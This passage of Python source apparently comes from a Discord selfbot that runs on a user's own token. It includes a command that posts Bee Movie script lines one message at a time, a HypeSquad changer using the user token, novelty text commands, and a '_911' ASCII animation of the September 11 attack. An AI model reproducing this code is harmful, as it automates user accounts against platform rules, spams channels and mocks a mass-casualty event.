        await ctx.send("Making honey takes a lot of bees")
        await ctx.send("doing a lot of small jobs.")
        await ctx.send("But let me tell you about a small job.")
        await ctx.send("If you do it well,")
        await ctx.send("it makes a big difference.")
        await ctx.send("More than we realized.")
        await ctx.send("To us, to everyone.")
        await ctx.send("That's why I want to get bees")
        await ctx.send("back to working together.")
        await ctx.send("That's the bee way!")
        await ctx.send("We're not made of Jell-O.")
        await ctx.send("We get behind a fellow.")
        await ctx.send("- Black and yellow!")
        await ctx.send("- Hello!")
        await ctx.send("Left, right, down, hover.")
        await ctx.send("- Hover?")
        await ctx.send("- Forget hover.")
        await ctx.send("This isn't so hard.")
        await ctx.send("Beep-beep! Beep-beep!")
        await ctx.send("Barry, what happened?!")
        await ctx.send("Wait, I think we were")
        await ctx.send("on autopilot the whole time.")
        await ctx.send("- That may have been helping me.")
        await ctx.send("- And now we're not!")
        await ctx.send("So it turns out I cannot fly a plane.")
        await ctx.send("All of you, let's get")
        await ctx.send("behind this fellow! Move it out!")
        await ctx.send("Move out!")
        await ctx.send("Our only chance is if I do what I'd do,")
        await ctx.send("you copy me with the wings of the plane!")
        await ctx.send("Don't have to yell.")
        await ctx.send("I'm not yelling!")
        await ctx.send("We're in a lot of trouble.")
        await ctx.send("It's very hard to concentrate")
        await ctx.send("with that panicky tone in your voice!")
        await ctx.send("It's not a tone. I'm panicking!")
        await ctx.send("I can't do this!")
        await ctx.send("Vanessa, pull yourself together.")
        await ctx.send("You have to snap out of it!")
        await ctx.send("You snap out of it.")
        await ctx.send("You snap out of it.")
        await ctx.send("- You snap out of it!")
        await ctx.send("- You snap out of it!")
        await ctx.send("- You snap out of it!")
        await ctx.send("- You snap out of it!")
        await ctx.send("- You snap out of it!")
        await ctx.send("- You snap out of it!")
        await ctx.send("- Hold it!")
        await ctx.send("- Why? Oome on, it's my turn.")
        await ctx.send("How is the plane flying?")
        await ctx.send("I don't know.")
        await ctx.send("Hello?")
        await ctx.send("Benson, got any flowers")
        await ctx.send("for a happy occasion in there?")
        await ctx.send("The Pollen Jocks!")
        await ctx.send("They do get behind a fellow.")
        await ctx.send("- Black and yellow.")
        await ctx.send("- Hello.")
        await ctx.send("All right, let's drop this tin can")
        await ctx.send("on the blacktop.")
        await ctx.send("Where? I can't see anything. Oan you?")
        await ctx.send("No, nothing. It's all cloudy.")
        await ctx.send("Oome on. You got to think bee, Barry.")
        await ctx.send("- Thinking bee.")
        await ctx.send("- Thinking bee.")
        await ctx.send("Thinking bee!")
        await ctx.send("Thinking bee! Thinking bee!")
        await ctx.send("Wait a minute.")
        await ctx.send("I think I'm feeling something.")
        await ctx.send("- What?")
        await ctx.send("- I don't know. It's strong, pulling me.")
        await ctx.send("Like a 27-million-year-old instinct.")
        await ctx.send("Bring the nose down.")
        await ctx.send("Thinking bee!")
        await ctx.send("Thinking bee! Thinking bee!")
        await ctx.send("- What in the world is on the tarmac?")
        await ctx.send("- Get some lights on that!")
        await ctx.send("Thinking bee!")
        await ctx.send("Thinking bee! Thinking bee!")
        await ctx.send("- Vanessa, aim for the flower.")
        await ctx.send("- OK.")
        await ctx.send("Out the engines. We're going in")
        await ctx.send("on bee power. Ready, boys?")
        await ctx.send("Affirmative!")
        await ctx.send("Good. Good. Easy, now. That's it.")
        await ctx.send("Land on that flower!")
        await ctx.send("Ready? Full reverse!")
        await ctx.send("Spin it around!")
        await ctx.send("- Not that flower! The other one!")
        await ctx.send("- Which one?")
        await ctx.send("- That flower.")
        await ctx.send("- I'm aiming at the flower!")
        await ctx.send("That's a fat guy in a flowered shirt.")
        await ctx.send("I mean the giant pulsating flower")
        await ctx.send("made of millions of bees!")
        await ctx.send("Pull forward. Nose down. Tail up.")
        await ctx.send("Rotate around it.")
        await ctx.send("- This is insane, Barry!")
        await ctx.send("- This's the only way I know how to fly.")
        await ctx.send("Am I koo-koo-kachoo, or is this plane")
        await ctx.send("flying in an insect-like pattern?")
        await ctx.send("Get your nose in there. Don't be afraid.")
        await ctx.send("Smell it. Full reverse!")
        await ctx.send("Just drop it. Be a part of it.")
        await ctx.send("Aim for the center!")
        await ctx.send("Now drop it in! Drop it in, woman!")
        await ctx.send("Oome on, already.")
        await ctx.send("Barry, we did it!")
        await ctx.send("You taught me how to fly!")
        await ctx.send("- Yes. No high-five!")
        await ctx.send("- Right.")
        await ctx.send("Barry, it worked!")
        await ctx.send("Did you see the giant flower?")
        await ctx.send("What giant flower? Where? Of course")
        await ctx.send("I saw the flower! That was genius!")
        await ctx.send("- Thank you.")
        await ctx.send("- But we're not done yet.")
        await ctx.send("Listen, everyone!")
        await ctx.send("This runway is covered")
        await ctx.send("with the last pollen")
        await ctx.send("from the last flowers")
        await ctx.send("available anywhere on Earth.")
        await ctx.send("That means this is our last chance.")
        await ctx.send("We're the only ones who make honey,")
        await ctx.send("pollinate flowers and dress like this.")
        await ctx.send("If we're gonna survive as a species,")
        await ctx.send("this is our moment! What do you say?")
        await ctx.send("Are we going to be bees, orjust")
        await ctx.send("Museum of Natural History keychains?")
        await ctx.send("We're bees!")
        await ctx.send("Keychain!")
        await ctx.send("Then follow me! Except Keychain.")
        await ctx.send("Hold on, Barry. Here.")
        await ctx.send("You've earned this.")
        await ctx.send("Yeah!")
        await ctx.send("I'm a Pollen Jock! And it's a perfect")
        await ctx.send("fit. All I gotta do are the sleeves.")
        await ctx.send("Oh, yeah.")
        await ctx.send("That's our Barry.")
        await ctx.send("Mom! The bees are back!")
        await ctx.send("If anybody needs")
        await ctx.send("to make a call, now's the time.")
        await ctx.send("I got a feeling we'll be")
        await ctx.send("working late tonight!")
        await ctx.send("Here's your change. Have a great")
        await ctx.send("afternoon! Oan I help who's next?")
        await ctx.send("Would you like some honey with that?")
        await ctx.send("It is bee-approved. Don't forget these.")
        await ctx.send("Milk, cream, cheese, it's all me.")
        await ctx.send("And I don't see a nickel!")
        await ctx.send("Sometimes I just feel")
        await ctx.send("like a piece of meat!")
        await ctx.send("I had no idea.")
        await ctx.send("Barry, I'm sorry.")
        await ctx.send("Have you got a moment?")
        await ctx.send("Would you excuse me?")
        await ctx.send("My mosquito associate will help you.")
        await ctx.send("Sorry I'm late.")
        await ctx.send("He's a lawyer too?")
        await ctx.send("I was already a blood-sucking parasite.")
        await ctx.send("All I needed was a briefcase.")
        await ctx.send("Have a great afternoon!")
        await ctx.send("Barry, I just got this huge tulip order,")
        await ctx.send("and I can't get them anywhere.")
        await ctx.send("No problem, Vannie.")
        await ctx.send("Just leave it to me.")
        await ctx.send("You're a lifesaver, Barry.")
        await ctx.send("Oan I help who's next?")
        await ctx.send("All right, scramble, jocks!")
        await ctx.send("It's time to fly.")
        await ctx.send("Thank you, Barry!")
        await ctx.send("That bee is living my life!")
        await ctx.send("Let it go, Kenny.")
        await ctx.send("- When will this nightmare end?!")
        await ctx.send("- Let it all go.")
        await ctx.send("- Beautiful day to fly.")
        await ctx.send("- Sure is.")
        await ctx.send("Between you and me,")
        await ctx.send("I was dying to get out of that office.")
        await ctx.send("You have got")
        await ctx.send("to start thinking bee, my friend.")
        await ctx.send("- Thinking bee!")
        await ctx.send("- Me?")
        await ctx.send("Hold it. Let's just stop")
        await ctx.send("for a second. Hold it.")
        await ctx.send("I'm sorry. I'm sorry, everyone.")
        await ctx.send("Oan we stop here?")
        await ctx.send("I'm not making a major life decision")
        await ctx.send("during a production number!")
        await ctx.send("All right. Take ten, everybody.")
        await ctx.send("Wrap it up, guys.")
        await ctx.send("I had virtually no rehearsal for that.")

    def leetText(text):
        getchar = lambda c: chars[c] if c in chars else c
        chars = {"a":"4","e":"3","l":"1","o":"0","s":"5", "A": "4", "E": "3", "L": "1", "O": "0", "S": "5"}
        return ''.join(getchar(c) for c in text)

    @React.command(name='1337', aliases=['leet'], usage="1337 <Text>", description="Turns Text to a 1337/leet message")
    async def _1337(ctx, *, message: str):
        await ctx.send(leetText(message))
        
    @React.command(usage="uwu <Text>", description="UwUfies a message")
    async def uwu(ctx, *, message: str):
        await ctx.send(UwUText(message))

    @React.command(usage="_8ball <Question>", description="Ask the Magic 8 ball")
    async def _8ball(ctx, *, question: str):
        responses = [
            "It is certain.",
            "It is decidedly so.",
            "Without a doubt.",
            "Yes - definitely.",
            "You may rely on it.",
            "As I see it, yes.",
            "Most likely.",
            "Outlook good.",
            "Yes.",
            "Signs point to yes.",
            "Reply hazy, try again.",
            "Ask again later.",
            "Better not tell you now.",
            "Cannot predict now.",
            "Concentrate and ask again.",
            "Don't count on it.",
            "My reply is no.",
            "My sources say no.",
            "Outlook not so good.",
            "Very doubtful."]
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='üé± 8 Ball üé±', description=f'Question: {question}\nAnswer: {random.choice(responses)}',timestamp=embed_timestamp())
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="hypesquad <Bravery/Balance/Brilliance>", description="Changes your HypeSquad House")
    async def hypesquad(ctx, house: str):
        async with httpx.AsyncClient() as client:
            if house.lower() == 'Bravery'.lower():
                await client.post('https://discord.com/api/v8/hypesquad/online', json={'house_id': 1}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Hypesquad', description=f'Changed Hypesquad House to Bravery',timestamp=embed_timestamp())
                embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            elif house.lower() == 'Balance'.lower():
                await client.post('https://discord.com/api/v8/hypesquad/online', json={'house_id': 3}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Hypesquad', description=f'Changed Hypesquad House to Balance',timestamp=embed_timestamp())
                embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            elif house.lower() == 'Brilliance'.lower():
                await client.post('https://discord.com/api/v8/hypesquad/online', json={'house_id': 2}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Hypesquad', description=f'Changed Hypesquad House to Brilliance',timestamp=embed_timestamp())
                embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                return

    @React.command(usage="embed <Title> <Text>", description="Sends and Embed with a custom title and text")
    async def embed(ctx, title, *, text):
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=title, description=text,timestamp=embed_timestamp())
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


    embed_thumbnail_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url']
    @React.command(usage="cembed <Title> [Description] [Footer] [Image URL]", description="Custom embed")
    async def cembed(ctx, title, description, footer=embed_footer, image_url = embed_thumbnail_url):
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=title, description=description, timestamp=embed_timestamp())
        embed.set_thumbnail(url=image_url)
        embed.set_footer(text=footer, icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="_911", description="Sends a short 9/11 animation")
    async def _911(ctx):
        
        first = r'''                     ,-------------------.
                ,'                    ;
                ,'                    .'|
            ,'                    .'# |
            ,'                    .'# # |
            :-------------------.'# # # | 
            | # # # # # # # # # | # # # |
            | # # # # # # # # # | # # # |
            | # # # # # # # # # | # # # |
            | # # # # # # # # # | # # # |
            | # # # # # # # # # | # # # |
            | # # # # # # # # # | # # # |
            | #,-'. # # # # # # | # # # |
            |_/'  / # # # # # # | # # # |
    _.--""     /_ # # # # # # | # # #  
    '__.--,       `-.# # # # # | # #    
        /  /''`--.__; # # # # | #      
    _,|\ ,'  # # # # # # # # #|       
    `--|._`.                            '''
        second = r'''                        ,-------------------.
                    ,'                    ;
                ,'                    .'|
                ,'                    .'# |
            ,'                    .'# # |888
            :-------------------.'# # # |)(888)
            | # # # # # # # # # | # # # |8888)(8)
            | # # # # # # # # # | # # # |88)(88) 
            '  | # # # # # # # # # | # # # |8)(88)  
        |  / - , # ####### # # # # | # # # |(8)
    -   / , .   ############# # # | # # # |   
    \  -  ,  '#################  | # # # |
    -  .  /  \ /############## #  | # # # |
            .  - / # # # # # # # | # # # |
            | # # # # # # # # # | # # # |
            | # # # # # # # # # | # # # |
            | # # # # # # # # # | # # #
            | # # # # # # # # # | # #  
            | # # # # # # # # # | # 
            | # # # # # # # # # |      '''

        third = r'''                    ,-------------------.     
                ,'                    ;  '::
            ,'                    .'|'::::
        ::.: ,'                    .'# |::::':
    ':':.: ,'                    .'# # |::':::'
    :'. : :-------------------.'# # # |':::'::
    :::.:| # # # # # # # # # | # # # |:::::'
    ::.:..| # # # # # # # # # | # # # |::'
    `:;.::'| # # # # # # # # # | # # # |
    '::..:'| #.:::.. # # # # # | # # # |
    :::::|.,:.:::::::..::# # | # # # |
    `:::::::::::.::..:#::::.# | # # # |
    `:':::`::'.::::. :: # # | # # # |
    ,`::::::::::'::'::' # # | # # # |
    `:;.::'| # # # # # # # # # | # # # |
        | # # # # # # # # # | # # # |
        | # # # # # # # # # | # # # 
        | # # # # # # # # # | # #   
        | # # # # # # # # # | #     
        | # # # # # # # # # |       '''
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], description=f"```{first}```",timestamp=embed_timestamp())
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        firstsent = await ctx.send(embed=embed, delete_after=json.load(open('config.json', encoding='utf-8'))['delete_timeout'])


        await asyncio.sleep(1)
        embed2 = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], description=f"```{second}```",timestamp=embed_timestamp())
        embed2.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed2.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await firstsent.edit(embed=embed2)
        await asyncio.sleep(1)
        embed3 = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], description=f"```{third}```",timestamp=embed_timestamp())
        embed3.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed3.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await firstsent.edit(embed=embed3)

    @React.command(usage="covid [Country]", description="Shows live COVID-19 stats")
    async def covid(ctx, country: str=None):            
        if country is None:
            request = requests.get(f'https://api.covid19api.com/summary')
            data = request.json()
            info = data['Global']
            totalconfirmed = info['TotalConfirmed']
            totalrecovered = info['TotalRecovered']
            totaldeaths = info['TotalDeaths']
            newconfirmed = info['NewConfirmed']
            newrecovered = info['NewRecovered']
            newdeaths = info['NewDeaths']
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='COVID-19 Live Stats',timestamp=embed_timestamp())
            embed.add_field(name=f'__ü¶† Total Confirmed Cases__', value=f'{totalconfirmed}', inline=True)
            embed.add_field(name=f'__‚ò†Ô∏è Total Deaths__', value=f'{totaldeaths}', inline=True)
            embed.add_field(name=f'__üß™ Total Recovered__', value=f'{totalrecovered}', inline=True)
            embed.add_field(name=f'__ü¶† New Confirmed Cases__', value=f'{newconfirmed}', inline=True)
            embed.add_field(name=f'__‚ò†Ô∏è New Deaths__', value=f'{newdeaths}', inline=True)
            embed.add_field(name=f'__üß™ New Recovered__', value=f'{newrecovered}', inline=True)
            embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        else:
            request = requests.get(f'https://api.covid19api.com/country/{country}')
            data = request.json()
            info = data[len(data) - 1]
            countryname = info['Country']
            confirmed = info['Confirmed']
            deaths = info['Deaths']
            recovered = info['Recovered']
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'COVID-19 Live Stats of {countryname}',timestamp=embed_timestamp())
            embed.add_field(name=f'__ü¶† Confirmed Cases__', value=f'{confirmed}', inline=True)
            embed.add_field(name=f'__‚ò†Ô∏è Deaths__', value=f'{deaths}', inline=True)
            embed.add_field(name=f'__üß™ Recovered__', value=f'{recovered}', inline=True)
            embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


    
    @React.command(usage="pcspecs", description="Sends your PC specifications")
    async def pcspecs(ctx):
        
        if sys.platform == "win32":
            computer = wmi.WMI()
            os_info = computer.Win32_OperatingSystem()[0]
            os_name = os_info.Name.encode('utf-8').split(b'|')[0]
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='My PC Specifications',timestamp=embed_timestamp())
            embed.add_field(name=f'__üß∞ Platform__', value=str(os_name).replace("'", "").replace("b", "", 1), inline=True)
            embed.add_field(name=f'__üî∞ Architecture__', value=f'{platform.machine()}', inline=True)
            embed.add_field(name=f'__üëæ RAM__', value=f'{str(round(psutil.virtual_memory().total / (1024.0 **3)))} GB', inline=True)
            embed.add_field(name=f'__üéÆ GPU__', value=f'{computer.Win32_VideoController()[0].Name}', inline=True)
            embed.add_field(name=f'__‚öôÔ∏è CPU__', value=f'{computer.Win32_Processor()[0].Name}', inline=True)
            embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        else:
            try:
                uname = platform.uname()
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='My PC Specifications',timestamp=embed_timestamp())
                embed.add_field(name=f'__üß∞ Platform__', value=f'{uname.system}', inline=True)
                embed.add_field(name=f'__üíâ Release__', value=f'{uname.release}', inline=True)
                embed.add_field(name=f'__üåÄ Distribution__', value=f'{distro.linux_distribution()}', inline=True)
                embed.add_field(name=f'__üî∞ Architecture__', value=f'{uname.machine}', inline=True)
                embed.add_field(name=f'__üëæ RAM__', value=f'{str(round(psutil.virtual_memory().total / (1024.0 **3)))} GB', inline=True)
                embed.add_field(name=f'__üî• Node Name__', value=f'{uname.node}', inline=True)
                embed.add_field(name=f'__‚òÑÔ∏è Version__', value=f'{uname.version}', inline=True)
                embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            except Exception:
                pass


    @React.command(pass_context=True)
    async def react(ctx, msg: str, msg_id='last', channel='current', prefer_combine: bool=False):
        try:
        
            msg = msg.lower()

            msg_id = None if not msg_id.isdigit() else int(msg_id)

            limit = 25 if msg_id else 1

            reactions = []
